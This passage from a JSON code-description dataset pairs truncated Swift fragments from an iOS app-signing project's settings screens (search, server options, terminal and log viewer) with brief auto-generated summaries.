    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Search/SearchSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2942",
    "code": "override func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {\ntableView.deselectRow(at: indexPath, animated: true)\n\nswitch Section(rawValue: indexPath.section) {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Search/SearchSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2943",
    "code": "private func searchDepthString(for depth: SearchDepth) -> String {\nswitch depth {",
    "nl": "MARK: - Helper Methods",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Search/SearchSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2944",
    "code": "private func showSearchDepthPicker() {\nlet alert = UIAlertController(\ntitle: \"Default Search Depth\",\nmessage: \"Select the default depth for searches\",\npreferredStyle: .actionSheet\n)\n\nlet depths: [SearchDepth] = [.standard, .enhanced, .deep, .specialized]\n\nfor depth in depths {",
    "nl": "Function showSearchDepthPicker - implements showsearchdepthpicker functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Search/SearchSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2945",
    "code": "private func showAddDomainAlert() {\nlet alert = UIAlertController(\ntitle: \"Add Domain to Exclusion List\",\nmessage: \"Enter a domain name (e.g., example.com)\",\npreferredStyle: .alert\n)\n\nalert.addTextField { textField in",
    "nl": "Function showAddDomainAlert - implements showadddomainalert functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Search/SearchSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2946",
    "code": "private func showRemoveDomainAlert(at index: Int) {\nguard index < excludedDomains.count else { return }",
    "nl": "Function showRemoveDomainAlert - implements showremovedomainalert functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Search/SearchSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2947",
    "code": "private func showResetConfirmation() {\nlet alert = UIAlertController(\ntitle: \"Reset Search Settings\",\nmessage: \"This will restore all search settings to their default values. This cannot be undone.\",\npreferredStyle: .alert\n)\n\nalert.addAction(UIAlertAction(title: \"Cancel\", style: .cancel))\n\nalert.addAction(UIAlertAction(title: \"Reset\", style: .destructive) { [weak self] _ in",
    "nl": "Function showResetConfirmation - implements showresetconfirmation functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Search/SearchSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2948",
    "code": "private func resetSearchSettings() {\n// Reset default search depth\nselectedDefaultDepth = .enhanced\nUserDefaults.standard.set(selectedDefaultDepth.rawValue, forKey: \"default_search_depth\")\n\n// Reset privacy settings\nprivacyManager.updateSettings(\nsearchEnabled: true,\ndeepSearchEnabled: true,\ncrawlingEnabled: true,",
    "nl": "Function resetSearchSettings - implements resetsearchsettings functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Search/SearchSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2949",
    "code": "class ServerOptionsViewController: FRSTableViewController {\nvar isDownloadingCertifcate = false\n\noverride func viewDidLoad() {",
    "nl": "class ServerOptionsViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Server Options/ServerOptionsViewController.swift",
    "code_type": "class"
  },
  {
    "id": "2950",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\n\ntableData = [\n[\n\"App Updates\",\n],\n[\n\"Use Server\",\nString.localized(\"SETTINGS_VIEW_CONTROLLER_CELL_USE_CUSTOM_SERVER\"),",
    "nl": "Function viewDidLoad - implements viewdidload functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Server Options/ServerOptionsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2951",
    "code": "extension ServerOptionsViewController {\noverride func tableView(_: UITableView, titleForFooterInSection section: Int) -> String? {",
    "nl": "extension ServerOptionsViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Server Options/ServerOptionsViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "2952",
    "code": "override func tableView(_: UITableView, titleForFooterInSection section: Int) -> String? {\nswitch section {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Server Options/ServerOptionsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2953",
    "code": "override func tableView(_: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {\nlet reuseIdentifier = \"Cell\"\nlet cell = UITableViewCell(style: .value1, reuseIdentifier: reuseIdentifier)\ncell.accessoryType = .none\ncell.selectionStyle = .none\n\nlet cellText = tableData[indexPath.section][indexPath.row]\ncell.textLabel?.text = cellText\n\nswitch cellText {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Server Options/ServerOptionsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2954",
    "code": "override func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {\nlet itemTapped = tableData[indexPath.section][indexPath.row]\nswitch itemTapped {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Server Options/ServerOptionsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2955",
    "code": "@objc func appUpdates(_ sender: UISwitch) {\nPreferences.appUpdates = sender.isOn\n}\n\n@objc func onlinePathToggled(_ sender: UISwitch) {",
    "nl": "Function appUpdates - implements appupdates functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Server Options/ServerOptionsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2956",
    "code": "@objc func onlinePathToggled(_ sender: UISwitch) {\nPreferences.userSelectedServer = sender.isOn\n\nlet alertController = UIAlertController(\ntitle: \"\",\nmessage: String.localized(\"SUCCESS_REQUIRES_RESTART\"),\npreferredStyle: .alert\n)\n\nlet closeAction = UIAlertAction(title: String.localized(\"OK\"), style: .default) { _ in",
    "nl": "Function onlinePathToggled - implements onlinepathtoggled functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Server Options/ServerOptionsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2957",
    "code": "private func updateCells() {\nif Preferences.onlinePath != Preferences.defaultInstallPath {",
    "nl": "Function updateCells - updates cells",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Server Options/ServerOptionsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2958",
    "code": "private func handleInstallPathChange(_ newInstallPath: String?) {\nif newInstallPath != Preferences.defaultInstallPath {",
    "nl": "Function handleInstallPathChange - implements handleinstallpathchange functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Server Options/ServerOptionsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2959",
    "code": "extension ServerOptionsViewController {\nfunc resetConfigDefault() {",
    "nl": "extension ServerOptionsViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Server Options/ServerOptionsViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "2960",
    "code": "func resetConfigDefault() {\nPreferences.onlinePath = Preferences.defaultInstallPath\n}\n\nfunc showChangeDownloadURLAlert() {",
    "nl": "Function resetConfigDefault - implements resetconfigdefault functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Server Options/ServerOptionsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2961",
    "code": "func showChangeDownloadURLAlert() {\nlet alert = UIAlertController(\ntitle: String.localized(\"SETTINGS_VIEW_CONTROLLER_URL_ALERT_TITLE\"),\nmessage: nil,\npreferredStyle: .alert\n)\n\nalert.addTextField { textField in",
    "nl": "Function showChangeDownloadURLAlert - implements showchangedownloadurlalert functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Server Options/ServerOptionsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2962",
    "code": "@objc func textURLDidChange(_ textField: UITextField) {\nguard let alertController = presentedViewController as? UIAlertController,\nlet setAction = alertController.actions.first(where: { $0.title == String.localized(\"SET\") })",
    "nl": "API key configuration methods removed as requested",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Server Options/ServerOptionsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2963",
    "code": "func isValidURL(_ url: String) -> Bool {\nlet urlPredicate = NSPredicate(format: \"SELF MATCHES %@\", \"https://.+\")\nreturn urlPredicate.evaluate(with: url)\n}\n}\n",
    "nl": "Function isValidURL - checks if validurl",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Server Options/ServerOptionsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2964",
    "code": "class LaunchTerminalViewController: UIViewController {\nprivate let containerView = UIView()\nprivate let launchButton = UIButton(type: .system)\nprivate let iconImageView = UIImageView()\nprivate let descriptionLabel = UILabel()\nprivate let logger = Debug.shared\n\noverride func viewDidLoad() {",
    "nl": "/ LaunchTerminalViewController - Button to launch the terminal / This view controller provides a simplified UI to launch the Terminal",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/LaunchTerminalViewController.swift",
    "code_type": "class"
  },
  {
    "id": "2965",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\n\ntitle = \"Terminal\"\nview.backgroundColor = UIColor(named: \"Background\") ?? .systemBackground\n\nsetupUI()\nsetupConstraints()\n\nlogger.log(message: \"Terminal launch view controller loaded\", type: .info)",
    "nl": "Function viewDidLoad - implements viewdidload functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/LaunchTerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2966",
    "code": "private func setupUI() {\n// Container view\ncontainerView.backgroundColor = .clear\ncontainerView.translatesAutoresizingMaskIntoConstraints = false\nview.addSubview(containerView)\n\n// Terminal icon\niconImageView.image = UIImage(systemName: \"terminal\")\niconImageView.contentMode = .scaleAspectFit\niconImageView.tintColor = .tintColor",
    "nl": "Function setupUI - sets upui",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/LaunchTerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2967",
    "code": "private func setupConstraints() {\nNSLayoutConstraint.activate([\n// Container view\ncontainerView.centerXAnchor.constraint(equalTo: view.centerXAnchor),\ncontainerView.centerYAnchor.constraint(equalTo: view.centerYAnchor),\ncontainerView.widthAnchor.constraint(equalTo: view.widthAnchor, multiplier: 0.85),\n\n// Icon\niconImageView.topAnchor.constraint(equalTo: containerView.topAnchor),\niconImageView.centerXAnchor.constraint(equalTo: containerView.centerXAnchor),",
    "nl": "Function setupConstraints - sets upconstraints",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/LaunchTerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2968",
    "code": "@objc private func launchTerminal() {\nlogger.log(message: \"Launching terminal from launch view\", type: .info)\n\nlet terminalVC = TerminalViewController()\nlet navController = UINavigationController(rootViewController: terminalVC)\nnavController.modalPresentationStyle = .fullScreen\n\npresent(navController, animated: true)\n}\n}",
    "nl": "Function launchTerminal - implements launchterminal functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/LaunchTerminalViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2969",
    "code": "class TerminalSettingsViewController: UITableViewController {\nprivate enum SettingSection: Int, CaseIterable {",
    "nl": "class TerminalSettingsViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/TerminalSettingsViewController.swift",
    "code_type": "class"
  },
  {
    "id": "2970",
    "code": "private enum SettingSection: Int, CaseIterable {\ncase terminalSettings\ncase dangerZone\n}\n\nprivate enum TerminalSetting: Int, CaseIterable {",
    "nl": "enum SettingSection - implements functionality related to setting section",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/TerminalSettingsViewController.swift",
    "code_type": "enum"
  },
  {
    "id": "2971",
    "code": "private enum TerminalSetting: Int, CaseIterable {\ncase fontSize\ncase colorTheme\ncase clearHistory\n}\n\nprivate enum DangerZoneSetting: Int, CaseIterable {",
    "nl": "enum TerminalSetting - implements functionality related to terminal setting",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/TerminalSettingsViewController.swift",
    "code_type": "enum"
  },
  {
    "id": "2972",
    "code": "private enum DangerZoneSetting: Int, CaseIterable {\ncase endSession\n}\n\nprivate let logger = Debug.shared\nprivate let defaults = UserDefaults.standard\n\n// Default settings (Server settings removed)\n\nprivate var fontSize: Int {",
    "nl": "enum DangerZoneSetting - implements functionality related to danger zone setting",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/TerminalSettingsViewController.swift",
    "code_type": "enum"
  },
  {
    "id": "2973",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\n\n// Set up the table view\ntitle = \"Terminal Settings\"\ntableView.register(UITableViewCell.self, forCellReuseIdentifier: \"Cell\")\ntableView.register(UITableViewCell.self, forCellReuseIdentifier: \"ValueCell\")\ntableView.register(UITableViewCell.self, forCellReuseIdentifier: \"ActionCell\")\n\n// Set initial default values if needed",
    "nl": "Function viewDidLoad - implements viewdidload functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/TerminalSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2974",
    "code": "override func numberOfSections(in _: UITableView) -> Int {\nreturn SettingSection.allCases.count\n}\n\noverride func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {",
    "nl": "MARK: - Table view data source",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/TerminalSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2975",
    "code": "override func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {\nguard let settingSection = SettingSection(rawValue: section) else { return 0 }",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/TerminalSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2976",
    "code": "override func tableView(_: UITableView, titleForHeaderInSection section: Int) -> String? {\nguard let settingSection = SettingSection(rawValue: section) else { return nil }",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/TerminalSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2977",
    "code": "override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {\nguard let section = SettingSection(rawValue: indexPath.section) else {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/TerminalSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2978",
    "code": "private func terminalSettingsCell(for indexPath: IndexPath) -> UITableViewCell {\nlet cell = tableView.dequeueReusableCell(withIdentifier: \"ValueCell\", for: indexPath)\nguard let setting = TerminalSetting(rawValue: indexPath.row) else { return cell }",
    "nl": "Function terminalSettingsCell - implements terminalsettingscell functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/TerminalSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2979",
    "code": "private func dangerZoneCell(for indexPath: IndexPath) -> UITableViewCell {\nlet cell = tableView.dequeueReusableCell(withIdentifier: \"ActionCell\", for: indexPath)\nguard let setting = DangerZoneSetting(rawValue: indexPath.row) else { return cell }",
    "nl": "Function dangerZoneCell - implements dangerzonecell functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/TerminalSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2980",
    "code": "override func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {\ntableView.deselectRow(at: indexPath, animated: true)\n\nguard let section = SettingSection(rawValue: indexPath.section) else { return }",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/TerminalSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2981",
    "code": "private func handleTerminalSettingTap(_ row: Int) {\nguard let setting = TerminalSetting(rawValue: row) else { return }",
    "nl": "Function handleTerminalSettingTap - implements handleterminalsettingtap functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/TerminalSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2982",
    "code": "private func handleDangerZoneTap(_ row: Int) {\nguard let setting = DangerZoneSetting(rawValue: row) else { return }",
    "nl": "Function handleDangerZoneTap - implements handledangerzonetap functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/TerminalSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2983",
    "code": "private func showFontSizePicker() {\nlet fontSizes = [10, 12, 14, 16, 18, 20, 24]\nlet alert = UIAlertController(title: \"Font Size\", message: nil, preferredStyle: .actionSheet)\n\nfor size in fontSizes {",
    "nl": "MARK: - Settings Handlers Server settings removed as requested",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/TerminalSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2984",
    "code": "private func showColorThemePicker() {\nlet themes = [\"Default\", \"Light\", \"Dark\", \"Solarized\"]\nlet alert = UIAlertController(title: \"Color Theme\", message: nil, preferredStyle: .actionSheet)\n\nfor (index, theme) in themes.enumerated() {",
    "nl": "Function showColorThemePicker - implements showcolorthemepicker functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/TerminalSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2985",
    "code": "private func confirmClearHistory() {\nlet alert = UIAlertController(\ntitle: \"Clear Command History\",\nmessage: \"Are you sure you want to clear your terminal command history? This action cannot be undone.\",\npreferredStyle: .alert\n)\n\nalert.addAction(UIAlertAction(title: \"Cancel\", style: .cancel))\nalert.addAction(UIAlertAction(title: \"Clear\", style: .destructive) { _ in",
    "nl": "Function confirmClearHistory - implements confirmclearhistory functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/TerminalSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2986",
    "code": "private func confirmEndSession() {\nlet alert = UIAlertController(\ntitle: \"End Current Session\",\nmessage: \"Are you sure you want to end your current terminal session?\",\npreferredStyle: .alert\n)\n\nalert.addAction(UIAlertAction(title: \"Cancel\", style: .cancel))\nalert.addAction(UIAlertAction(title: \"End Session\", style: .destructive) { _ in",
    "nl": "Function confirmEndSession - implements confirmendsession functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Terminal/TerminalSettingsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2987",
    "code": "class LogsViewController: UIViewController {\nvar tableView: UITableView!\nprivate var logTextView: UITextView!\nprivate var logFileObserver: DispatchSourceFileSystemObject?\nprivate var currentFileSize: UInt64 = 0\nprivate var errCount = 0\n\noverride func viewDidLoad() {",
    "nl": "class LogsViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/View Logs/LogsViewController.swift",
    "code_type": "class"
  },
  {
    "id": "2988",
    "code": "override func viewDidLoad() {\nsuper.viewDidLoad()\nsetupNavigation()\nsetupViews()\nstartObservingLogFile()\n}\n\noverride func viewDidAppear(_: Bool) {",
    "nl": "Function viewDidLoad - implements viewdidload functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/View Logs/LogsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2989",
    "code": "override func viewDidAppear(_: Bool) {\nsuper.viewDidAppear(false)\nparseLogFile()\ntableView.reloadSections(IndexSet([0]), with: .automatic)\n}\n\nfileprivate func setupNavigation() {",
    "nl": "Function viewDidAppear - implements viewdidappear functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/View Logs/LogsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2990",
    "code": "fileprivate func setupNavigation() {\nnavigationItem.largeTitleDisplayMode = .never\n}\n\nfileprivate func setupViews() {",
    "nl": "Function setupNavigation - sets upnavigation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/View Logs/LogsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2991",
    "code": "fileprivate func setupViews() {\nview.backgroundColor = .systemBackground\nlogTextView = UITextView()\nlogTextView.isEditable = false\nlogTextView.translatesAutoresizingMaskIntoConstraints = false\nlogTextView.font = UIFont.monospacedSystemFont(ofSize: 10, weight: .regular)\nlogTextView.textContainerInset = UIEdgeInsets(top: 0, left: 16, bottom: 0, right: 16)\nview.addSubview(logTextView)\n\ntableView = UITableView(frame: .zero, style: .insetGrouped)",
    "nl": "Function setupViews - sets upviews",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/View Logs/LogsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2992",
    "code": "private func loadInitialLogContents() {\nlet logFilePath = getDocumentsDirectory().appendingPathComponent(\"logs.txt\")\n\nguard let fileHandle = try? FileHandle(forReadingFrom: logFilePath) else {",
    "nl": "Function loadInitialLogContents - implements loadinitiallogcontents functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/View Logs/LogsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2993",
    "code": "private func startObservingLogFile() {\nlet logFilePath = getDocumentsDirectory().appendingPathComponent(\"logs.txt\").path\n\nlet fileDescriptor = open(logFilePath, O_EVTONLY)\nif fileDescriptor == -1 {",
    "nl": "Function startObservingLogFile - implements startobservinglogfile functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/View Logs/LogsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2994",
    "code": "private func loadNewLogContents() {\nlet logFilePath = getDocumentsDirectory().appendingPathComponent(\"logs.txt\")\n\nguard let fileHandle = try? FileHandle(forReadingFrom: logFilePath) else {",
    "nl": "Function loadNewLogContents - implements loadnewlogcontents functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/View Logs/LogsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2995",
    "code": "private func scrollToBottom() {\nlet bottomRange = NSMakeRange(logTextView.text.count - 1, 1)\nlogTextView.scrollRangeToVisible(bottomRange)\n}\n\nprivate func parseLogFile() {",
    "nl": "Function scrollToBottom - implements scrolltobottom functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/View Logs/LogsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2996",
    "code": "private func parseLogFile() {\nlet logFilePath = getDocumentsDirectory().appendingPathComponent(\"logs.txt\")\ndo {",
    "nl": "Function parseLogFile - implements parselogfile functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/View Logs/LogsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2997",
    "code": "extension LogsViewController: UITableViewDataSource, UITableViewDelegate {\nfunc numberOfSections(in _: UITableView) -> Int { return 2 }",
    "nl": "extension LogsViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/View Logs/LogsViewController.swift",
    "code_type": "extension"
  },
  {
    "id": "2998",
    "code": "func numberOfSections(in _: UITableView) -> Int { return 2 }\nfunc tableView(_: UITableView, heightForFooterInSection _: Int) -> CGFloat { return 0 }",
    "nl": "Function numberOfSections - implements numberofsections functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/View Logs/LogsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "2999",
    "code": "func tableView(_: UITableView, heightForFooterInSection _: Int) -> CGFloat { return 0 }\n\nfunc tableView(_: UITableView, viewForFooterInSection _: Int) -> UIView? {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/View Logs/LogsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3000",
    "code": "func tableView(_: UITableView, viewForFooterInSection _: Int) -> UIView? {\nlet headerView = InsetGroupedSectionHeader(title: \"\")\nreturn headerView\n}\n\nfunc tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/View Logs/LogsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3001",
    "code": "func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {\nswitch section {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/View Logs/LogsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3002",
    "code": "func tableView(_: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {\nlet reuseIdentifier = \"Cell\"\nlet cell = UITableViewCell(style: .value1, reuseIdentifier: reuseIdentifier)\ncell.accessoryType = .none\ncell.selectionStyle = .none\n\nswitch (indexPath.section, indexPath.row) {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/View Logs/LogsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3003",
    "code": "func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {\nswitch (indexPath.section, indexPath.row) {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/View Logs/LogsViewController.swift",
    "code_type": "function"
  },
  {
    "id": "3004",
    "code": "class SigningMainDataWrapper: ObservableObject {\n@Published var mainOptions: MainSigningOptions\n\ninit(mainOptions: MainSigningOptions) {",
    "nl": "class SigningMainDataWrapper - implements functionality related to signing main data wrapper",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Signing/SigningData/SigningDataWrapper.swift",
    "code_type": "class"
  },
  {
    "id": "3005",
    "code": "class SigningDataWrapper: ObservableObject {\n@Published var signingOptions: SigningOptions\n\ninit(signingOptions: SigningOptions) {",
